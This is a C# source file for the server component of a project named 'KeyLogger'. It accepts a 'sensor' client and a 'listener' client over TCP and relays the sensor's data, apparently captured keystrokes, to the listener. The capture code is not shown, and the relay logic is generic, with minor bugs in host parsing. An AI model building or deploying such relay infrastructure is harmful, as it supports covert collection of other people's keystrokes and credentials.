using System;
using System.Net.Sockets;
using System.Net;
using System.IO;
using System.Threading.Tasks;
using System.Collections.Generic;

namespace KeyLogger.Server
{
    class Program
    {
        static void Main(string[] args)
        {
            if (args.Length != 1)
            {
                Console.WriteLine($"Usage: dotnet run KeyLogger.Server.dll <hostname|ip>[:<port>]");
                return;
            }

            var split = args[0].Split(':');
            if (split.Length < 1)
            {
                Console.WriteLine($"Usage: dotnet run KeyLogger.Server.dll <hostname|ip>:<port>");
                return;
            }
            
            int port = 10000;
            if (split.Length >= 2)
            {
                try
                {
                    port = int.Parse(split[1]);
                }
                catch (Exception e)
                {
                    Console.WriteLine("Invalid port: " + e.Message);
                    return;
                }
            }

            var endPoint = new DnsEndPoint(split[0], port);

            SensorClient sensor = null;
            ListenerClient listener = null;
            var tasks = new List<Task>();

            Console.WriteLine($"Starting server on {endPoint.Host}:{port}");
            
            var server = new TcpListener(IPAddress.Parse(endPoint.Host), port);
            server.Start();

            var factory = new ClientFactory();

            while (sensor is null || listener is null)
            {
                Console.Write("Waiting for a client... ");
                var tcpClient = server.AcceptTcpClient();
                try
                {
                    
                    var message = new ConnectionMessage();
                    message.Receive(tcpClient.GetStream());
                    var client = factory.CreateClient(tcpClient, message.Type.Value);
                    Console.WriteLine($"connected: {client.ToString()}");
                    if (client is ListenerClient)
                        listener = (ListenerClient)client;
                    else if (client is SensorClient)
                    {
                        sensor = (SensorClient)client;
                        sensor.DataReceived += (s, e) =>
                        {
                            listener?.Send(e.Data);
                        };
                    }
                    tasks.Add(client.Run());
                }
                catch (ArgumentException)
                {
                    Console.WriteLine("invalid type.");
                }
                catch (TimeoutException)
                {
                    Console.WriteLine("timeout.");
                }
            }

            Task.WaitAll(tasks.ToArray());
        }
    }
}
